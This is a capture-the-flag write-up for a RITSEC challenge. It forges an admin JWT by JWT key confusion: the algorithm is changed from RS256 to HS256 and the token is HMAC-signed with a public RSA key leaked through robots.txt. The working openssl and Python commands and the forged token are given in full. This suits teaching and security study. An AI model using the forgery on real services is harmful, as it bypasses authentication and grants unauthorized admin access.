# Description  
```  
Our First API  
472

ctfchallenges.ritsec.club:3000 ctfchallenges.ritsec.club:4000

Hint: You don't need the Bearer keyword!

Author: sandw1ch  
```

# Solution

We have two APIs, listening on port 3000 and 4000 on the same domain. On port
4000 we find API documentation.

> ## API Documentation  
>  
> Below are some of the api endpoints that you can use. Please use them
> responsibly :)!  
>  
> Use the format below to make your requests to the API.  
>  
> | *Nodes* | *Description* |  
> |:------|:------------|  
> | `/api/admin` | For admin users to authenticate. Please provide us your authorization token given to you by the /auth endpoint. |  
> | `/api/normal` | For standard users to authenticate. Please provide us your authorization token given to you by the /auth endpoint. |  
> | `/auth` | Authentication endpoint on port 3000. Please send your name and this api will return your token for accessing the api! |

Inspecting the source code of the API documentation page yields a hint:

```html  
</body>

</html>  
```

We request the `/auth` endpoint but receive an error.

```  
HTTP/1.1 400 Bad Request  
Server: nginx/1.14.0 (Ubuntu)  
Date: Sat, 16 Nov 2019 21:19:28 GMT  
Content-Type: application/json; charset=utf-8  
Content-Length: 35  
Connection: close  
X-Powered-By: Express  
ETag: W/"23-R2avBBYZNhW66Qk2Ww5q+bYPo7A"

{"reason":"missing name parameter"}  
```

We then supply a GET parameter that holds our name.

```  
GET /auth?name=geert HTTP/1.1  
Host: ctfchallenges.ritsec.club:3000  
[...]  
```

From this we get a JWT.

```  
HTTP/1.1 200 OK  
Server: nginx/1.14.0 (Ubuntu)  
X-Powered-By: Express  
[...]

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiZ2VlcnQiLCJ0eXBlIjoidXNlciIsImlhdCI6MTU3MzkzNzYxOH0.FVnhcP7ixblUlZpvpPDVALMx8SmO21aA1wlNWPmjxcwFkBHgOlxHQb-
Wxok15BAfZqFsDmvoYuQf2W9kEHdYmxdTcDjK-
ftHok3reqJNYXQi40SCMwLflD5t54SS2IOfEMKz1wqrcrYg-G8hseNnm0wj0wnyTe5PX_3LnQr0Ypg"}  
```

Using this JWT we can authenticate to the `/api/normal` endpoint on port 4000.

```  
GET /api/normal HTTP/1.1  
Host: ctfchallenges.ritsec.club:4000  
Authorization:
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiZ2VlcnQiLCJ0eXBlIjoidXNlciIsImlhdCI6MTU3MzkzNzE1OH0.NjTOAumK79ptAwBNsI-6cJZP5QGBqaZgQe2llWUryDVdvUN5ZYTekLQ7URCd-2-jKVqVr1XnlNBc63JNt5hjOP8zk_8LXjviBEw-9BeI4Sq17apL7ncQ7bBForChJ9hqSITvoFeFDa44tEMmWhT-
EKGqYf4vvV9c2hbp2km2mD4  
[...]  
```

The server informs us that authentication was successful.

```  
HTTP/1.1 200 OK  
Server: nginx/1.14.0 (Ubuntu)  
X-Powered-By: Express  
[...]

{"flag":"Congrats on authenticating! Too bad flags aren't for normal users
!!"}  
```

Sending the same JWT to the `/api/admin` endpoint does not work.

```  
HTTP/1.1 403 Forbidden  
Server: nginx/1.14.0 (Ubuntu)  
X-Powered-By: Express  
[...]

Invalid JWT or bad signature  
```

We saw before that there is a `robots.txt` to be found on port 3000.

```  
User-agent: *  
Disallow: /signing.pem  
Disallow: /auth  
```

We download `signing.pem` which turns out to be a RSA public key.  
The private counterpart of this key is used to sign the JWT that is
distributed upon authentication via the `/auth` endpoint.  
This suggests we might have to perform JWT key confusion attacks.

On [JWT.io](https://www.jwt.io) we paste the obtained token into the debugger
and find the following structure:

```  
Headers = {  
 "typ" : "JWT",  
 "alg" : "RS256"  
}

Payload = {  
 "name" : "geert",  
 "type" : "user",  
 "iat" : 1573936765  
}

Signature =
"nbPjfoCl967-e_eMNmC4Le5uf0Tv8seyFrPfwxCVHvIstjVzRn0-lY3LHBANNFbhjJ5BsLoWiiMxGzmNBPXLeW6g9RabuccIJLICY6RjurjflrOx-L6DA1VAhcjr-
fEeXteIYdGcQ_sHcNOphh47iZw94_eB9gcx86femBsYJFo"  
```

With the key confusion we essentially trick the JWT library on the server into
thinking the signature is created using symmetric cryptography (HMAC SHA256)
instead of assymmetric (RSA SHA256).

We modify the header to reflect this change and change the payload to indicate
we would like to be admin instead.

```  
Headers = {  
 "typ" : "JWT",  
 "alg" : "HS256"  
}

Payload = {  
 "name" : "geert",  
 "type" : "admin",  
 "iat" : 1573936765  
}  
```

We create the first two parts of the forged JWT:  
```  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiZ2VlcnQiLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5MzcxNTh9  
```

Next we sign the token and append the signature.

```  
$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiZ2VlcnQiLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5MzcxNTh9" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat signing.pem | xxd -p | tr -d "\\n")  
(stdin)= 384b003f89fd073941460a1e2bbb730584c60ee6f16c36b48e957fe916dc3e5d  
```

```  
$ python -c "exec(\"import base64, binascii\nprint
base64.urlsafe_b64encode(binascii.a2b_hex('384b003f89fd073941460a1e2bbb730584c60ee6f16c36b48e957fe916dc3e5d')).replace('=','')\")"  
OEsAP4n9BzlBRgoeK7tzBYTGDubxbDa0jpV_6RbcPl0  
```

We append the obtained signature to the first two parts and send it to the
`/api/admin` endpoint on port 4000.

```  
GET /api/admin HTTP/1.1  
Host: ctfchallenges.ritsec.club:4000  
Authorization:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiZ2VlcnQiLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5MzcxNTh9.OEsAP4n9BzlBRgoeK7tzBYTGDubxbDa0jpV_6RbcPl0  
[...]  
```

The server returns the flag.

```  
HTTP/1.1 200 OK  
Server: nginx/1.14.0 (Ubuntu)  
X-Powered-By: Express  
[...]

{"flag":"RITSEC{JWT_th1s_0ne_d0wn}"}  
```

We have now successfully solved the challenge by using JWT key confusion.